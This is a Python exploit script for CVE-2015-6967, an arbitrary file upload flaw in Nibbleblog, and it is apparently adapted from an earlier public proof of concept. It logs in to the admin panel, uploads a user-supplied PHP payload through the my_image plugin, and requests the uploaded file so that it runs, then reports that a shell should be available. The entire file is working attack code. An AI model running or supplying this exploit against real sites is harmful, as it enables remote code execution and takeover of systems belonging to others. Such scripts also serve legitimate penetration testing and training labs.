import argparse
import requests
from pathlib import Path
from colorama import Fore, Style

def print_info(message):
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} {message}")

def print_success(message):
    print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} {message}")

def print_error(message):
    print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {message}")

print_info("Original Author and Inspiration for this code: https://github.com/dix0nym/CVE-2015-6967\n")

def login(session, nibble_url, username, password):
    if nibble_url.endswith('/'):
        login_url = f"{nibble_url}admin.php"
    else:
        login_url = f"{nibble_url}/admin.php"
    
    session.get(login_url)

    login_post_response = session.post(login_url, data={'username': username, 'password': password})
    
    if 'Incorrect username or password' in login_post_response.text:
        print_error("Login failed!")
        return False
    else:
        print_success("Login successful!")
        return True

def upload_shell(session, nibble_url, payload):
    if nibble_url.endswith('/'):
        upload_url = f"{nibble_url}admin.php?controller=plugins&action=config&plugin=my_image"
    else:
        upload_url = f"{nibble_url}/admin.php?controller=plugins&action=config&plugin=my_image"
    
    files = {'image': ('nibbles.php', payload, 'application/x-php')}
    data = {
        'plugin': 'my_image',
        'title': 'Myimage',
        'position': '4',
        'caption': 'caption',
        'image_resize': '1',
        'image_width': '230',
        'image_height': '200',
        'image_option': 'auto'
    }

    upload_post_response = session.post(upload_url, data=data, files=files, timeout=30)
    
    if '<b>Warning</b>' in upload_post_response.text:
        print_success("Upload likely successful!")
    else:
        print_error("Upload likely failed!")

def execute_shell(session, nibble_url):
    if nibble_url.endswith('/'):
        exploit_url = f"{nibble_url}content/private/plugins/my_image/image.php"
    else:
        exploit_url = f"{nibble_url}/content/private/plugins/my_image/image.php"
    
    exploit_response = session.get(exploit_url)

    if exploit_response.status_code == 200:
        print_success(f'Exploit launched! You can check your shell or visit: {exploit_url}')
    else:
        print_error("Exploit failed!")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-l', required=True)
    parser.add_argument('--username', '-u', required=True)
    parser.add_argument('--password', '-p', required=True)
    parser.add_argument('--payload', '-x', required=True)
    args = parser.parse_args()
    payload_path = Path(args.payload)

    if not payload_path.exists():
        print_error(f"The path {payload_path} doesn't exist. Exiting.")
        return
    
    url = args.url
    username = args.username
    password = args.password

    with payload_path.open('r') as f:
        payload = f.read()

    session = requests.Session()
    
    if login(session, url, username, password):
        upload_shell(session, url, payload)
        execute_shell(session, url)

if __name__ == "__main__":
    main()
